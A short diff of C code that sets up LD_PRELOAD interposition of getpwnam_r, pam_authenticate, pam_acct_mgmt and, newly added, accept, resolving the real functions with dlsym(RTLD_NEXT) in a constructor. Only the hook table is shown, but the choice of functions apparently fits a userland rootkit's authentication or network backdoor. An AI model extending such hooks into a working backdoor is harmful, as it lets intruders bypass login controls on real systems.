@@ -2,25 +2,27 @@
 
 enum libcall_refs
 {
-    GETPWNAM_R,
-    PAM_AUTHENTICATE,
-    PAM_ACCT_MGMT,
-    N_LIBCALLS    /* Number of interposed libc functions. */
+	GETPWNAM_R,
+	PAM_AUTHENTICATE,
+	PAM_ACCT_MGMT,
+	ACCEPT,
+	N_LIBCALLS	/* Number of interposed libc functions. */
 };
 
 const void *(*libcalls[N_LIBCALLS])();
 const char *libc_names[] = \
 {
-    "getpwnam_r",
-    "pam_authenticate",
-    "pam_acct_mgmt"
+	"getpwnam_r",
+	"pam_authenticate",
+	"pam_acct_mgmt",
+	"accept"
 };
 
 __attribute__((constructor))
 void init_hooks(void)
 {
-    int i;
+	int i;
 
-    for(i = 0; i < N_LIBCALLS; i++)
-        libcalls[i] = dlsym(RTLD_NEXT, libc_names[i]);
+	for(i = 0; i < N_LIBCALLS; i++)
+		libcalls[i] = dlsym(RTLD_NEXT, libc_names[i]);
 };
